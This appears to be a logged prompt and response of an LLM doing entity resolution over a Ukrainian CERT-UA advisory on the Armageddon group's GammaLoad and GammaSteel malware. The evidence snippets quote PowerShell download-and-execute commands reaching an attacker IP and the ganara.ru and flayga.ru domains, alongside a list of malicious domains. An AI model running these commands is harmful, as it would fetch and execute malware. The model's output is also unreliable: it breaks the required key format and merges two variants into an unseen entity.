=== REQUEST (ollama gemma4:31b) ===
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ої пошти (зі скомпрометованих акаунтів і на приватні електронні адреси) HTM-дроперів (в тому числі, в UTF-16 кодуванні), що ініціюють ланцюг доставки GammaLoad.PS1 на комп'ютер жертви.</p><p>Метою зловмисників, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer."
Entities:
E1. PowerShell [aka powershell.exe]
E2. Browser.ps1
E152. hopentools.site
E153. devtools.bond
E154. bom02.gotdns.ch [aka gotdns.ch]
E155. balerina.info
E156. ukraine-chares.info
E157. ceriossl.info
E158. barvy-ukraines.info
E159. emtserviceca.info
E160. golos-ukr.info
E161. www.dropbox.com
E162. www.personlog.in
E163. www.binance.com.exmo.day
E164. protectraid.com
E165. www.binance.com.personlog.in
E166. vinergil.com
E167. ns1.authcheck.in
E168. atlantar.ru
E169. motoristo.ru
E170. moolin.ru
E171. bubenci.ru
E172. callsol.ru
E173. clipperso.ru
E174. cooperi.ru
E175. detroito.ru
E176. farafauler.ru
E177. fishitor.ru
E178. flayga.ru
E179. ganara.ru
E180. hawksi.ru
E181. hofsteder.ru
E182. kilitro.ru
E183. kurapat.ru
E184. leonardis.ru
E185. lnasfe.ru
E186. lopasts.ru
E187. mafirti.ru
E188. metanat.ru
E189. mitlubald.ru
E190. paparat.ru
E191. pasamart.ru
E192. qkcew.ru
E193. rncsq.ru
E194. tarlit.ru
E195. tbwelo.ru
E196. wicksl.ru
E197. xcqef.ru
E198. nxkad.ru
E199. dnslookup.seowebchecker.com
E200. ip-api.com
E201. tools.nexcess.net
E202. viewdns.info
E203. www.portcheckers.com
E204. lover.printing82.detroito.ru
Mentions:
M1. "GammaLoad.PS1" (Software) — options: E1, E2, E3, E4 — ctx: S1
M2. "GammaSteel.PS1" (Software) — options: E3, E1, E2, E11 — ctx: S1
M3. "GammaSteel.NET" (Software) — options: E3, E8, E11, E15 — ctx: S1
M4. "HarvesterX" (Software) — options: E18, E19, E20, E21 — ctx: S1
M5. "PowerShell (powershell.exe)" (Software) — options: E1, E6, E27, E28 — ctx: S2
M6. "lover.printing82.detroito.ru" (Domain) — options: E39, E40, E41, E42
M7. "atlantar.ru" (Domain) — options: E49, E50, E51, E42
M8. "motoristo.ru" (Domain) — options: E52, E42, E57, E49 — ctx: S8
M9. "moolin.ru" (Domain) — options: E49, E61, E54, E42
M10. "bubenci.ru" (Domain) — options: E49, E42, E66, E67
M11. "callsol.ru" (Domain) — options: E60, E54, E70, E42
M12. "clipperso.ru" (Domain) — options: E49, E42, E73, E74
M13. "cooperi.ru" (Domain) — options: E52, E78, E74, E42
M14. "detroito.ru" (Domain) — options: E49, E79, E42, E52
M15. "farafauler.ru" (Domain) — options: E49, E42, E83, E52
M16. "fishitor.ru" (Domain) — options: E52, E86, E42, E49
M17. "flayga.ru" (Domain) — options: E49, E67, E88, E42 — ctx: S4
M18. "ganara.ru" (Domain) — options: E49, E67, E91, E42 — ctx: S3
M19. "hawksi.ru" (Domain) — options: E82, E42, E68, E52
M20. "hofsteder.ru" (Domain) — options: E49, E42, E95, E60
M21. "kilitro.ru" (Domain) — options: E49, E52, E97, E42
M22. "kurapat.ru" (Domain) — options: E49, E67, E99, E42
M23. "leonardis.ru" (Domain) — options: E49, E42, E67, E46
M24. "lnasfe.ru" (Domain) — options: E60, E103, E42, E82 — ctx: S6
M25. "lopasts.ru" (Domain) — options: E49, E61, E104, E42
M26. "mafirti.ru" (Domain) — options: E52, E106, E107, E42
M27. "metanat.ru" (Domain) — options: E67, E42, E108, E52
M28. "mitlubald.ru" (Domain) — options: E49, E42, E110, E52
M29. "paparat.ru" (Domain) — options: E49, E76, E99, E42 — ctx: S5
M30. "pasamart.ru" (Domain) — options: E49, E76, E42, E63
M31. "qkcew.ru" (Domain) — options: E82, E42, E114, E49
M32. "rncsq.ru" (Domain) — options: E116, E117, E42, E82
M33. "tarlit.ru" (Domain) — options: E49, E110, E119, E42
M34. "tbwelo.ru" (Domain) — options: E52, E42, E81, E60
M35. "wicksl.ru" (Domain) — options: E60, E42, E70, E52
M36. "xcqef.ru" (Domain) — options: E63, E42, E123, E82
M37. "nxkad.ru" (Domain) — options: E60, E42, E110, E49 — ctx: S7
M38. "dnslookup.seowebchecker.com" (Domain) — options: E125, E126, E127, E128
M39. "ip-api.com" (Domain) — options: E135, E136, E137, E138
M40. "tools.nexcess.net" (Domain) — options: E145, E146, E147, E148
M41. "viewdns.info" (Domain) — options: E154, E155, E156, E138
M42. "www.portcheckers.com" (Domain) — options: E144, E161, E162, E126 — ctx: S7

=== RESPONSE (32.1s, in 5042 / out 7229 tok, stop) ===
{"m":"GammaLoad.PS1","id":"NEW","g":"a PowerShell script initiating a delivery chain"}
{"m":"GammaSteel.PS1","id":"E3","g":null}
{"m":"GammaSteel.NET","id":"E3","g":null}
{"m":"HarvesterX","id":"NEW","g":"a previously used software"}
{"m":"PowerShell (powershell.exe)","id":"E1","g":null}
{"m":"lover.printing82.detroito.ru","id":"NEW","g":"a domain"}
{"m":"atlantar.ru","id":"NEW","g":"a domain"}
{"m":"motoristo.ru","id":"NEW","g":"a domain"}
{"m":"moolin.ru","id":"NEW","g":"a domain"}
{"m":"bubenci.ru","id":"NEW","g":"a domain"}
{"m":"callsol.ru","id":"NEW","g":"a domain"}
{"m":"clipperso.ru","id":"NEW","g":"a domain"}
{"m":"cooperi.ru","id":"NEW","g":"a domain"}
{"m":"detroito.ru","id":"NEW","g":"a domain"}
{"m":"farafauler.ru","id":"NEW","g":"a domain"}
{"m":"fishitor.ru","id":"NEW","g":"a domain"}
{"m":"flayga.ru","id":"NEW","g":"a domain"}
{"m":"ganara.ru","id":"NEW","g":"a domain"}
{"m":"hawksi.ru","id":"NEW","g":"a domain"}
{"m":"hofsteder.ru","id":"NEW","g":"a domain"}
{"m":"kilitro.ru","id":"NEW","g":"a domain"}
{"m":"kurapat.ru","id":"NEW","g":"a domain"}
{"m":"leonardis.ru","id":"NEW","g":"a domain"}
{"m":"lnasfe.ru","id":"NEW","g":"a domain"}
{"m":"lopasts.ru","id":"NEW","g":"a domain"}
{"m":"mafirti.ru","id":"NEW","g":"a domain"}
{"m":"metanat.ru","id":"NEW","g":"a domain"}
{"m":"mitlubald.ru","id":"NEW","g":"a domain"}
{"m":"paparat.ru","id":"NEW","g":"a domain"}
{"m":"pasamart.ru","id":"NEW","g":"a domain"}
{"m":"qkcew.ru","id":"NEW","g":"a domain"}
{"m":"rncsq.ru","id":"NEW","g":"a domain"}
{"m":"tarlit.ru","id":"NEW","g":"a domain"}
{"m":"tbwelo.ru","id":"NEW","g":"a domain"}
{"m":"wicksl.ru","id":"NEW","g":"a domain"}
{"m":"xcqef.ru","id":"NEW","g":"a domain"}
{"m":"nxkad.ru","id":"NEW","g":"a domain"}
{"m":"dnslookup.seowebchecker.com","id":"NEW","g":"a domain"}
{"m":"ip-api.com","id":"NEW","g":"a domain"}
{"m":"tools.nexcess.net","id":"NEW","g":"a domain"}
{"m":"viewdns.info","id":"NEW","g":"a domain"}
{"m":"www.portcheckers.com","id":"NEW","g":"a domain"}
